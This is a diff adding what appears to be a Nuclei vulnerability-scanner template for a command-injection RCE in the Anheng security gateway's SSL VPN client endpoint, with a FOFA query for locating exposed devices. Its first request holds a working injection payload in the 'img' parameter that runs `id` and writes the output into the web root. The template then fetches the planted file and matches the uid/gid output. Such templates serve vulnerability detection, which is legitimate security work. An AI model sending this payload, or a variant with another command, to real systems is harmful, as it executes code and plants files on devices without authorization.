@@ -1,0 +1,35 @@
+id: anheng-das-gateway-sslvpn_client-rce
+
+info:
+  name: Anheng Gateway - Remote Code Execution
+  author: leadlife
+  severity: critical
+  description: Anheng Gateway has a remote code execution vulnerability.
+  reference:
+    - todo
+  metadata:
+    tips: cnvd-2023-03898
+    verified: true
+    fofa-query: title="明御安全网关"
+  tags: anheng,rce,iot
+
+http:
+  - raw:
+      - |
+        GET /sslvpn/sslvpn_client.php?client=logoImg&img=x%20/tmp%7Cecho%20%60id%60%20%7Ctee%20/usr/local/webui/test HTTP/1.1
+        Host: {{Hostname}}
+      
+      - |
+        GET /test HTTP/1.1
+        Host: {{Hostname}}
+ 
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'uid=\d+\(([^)]+)\) gid=\d+\(([^)]+)\)'
+
+      - type: status
+        status:
+          - 200
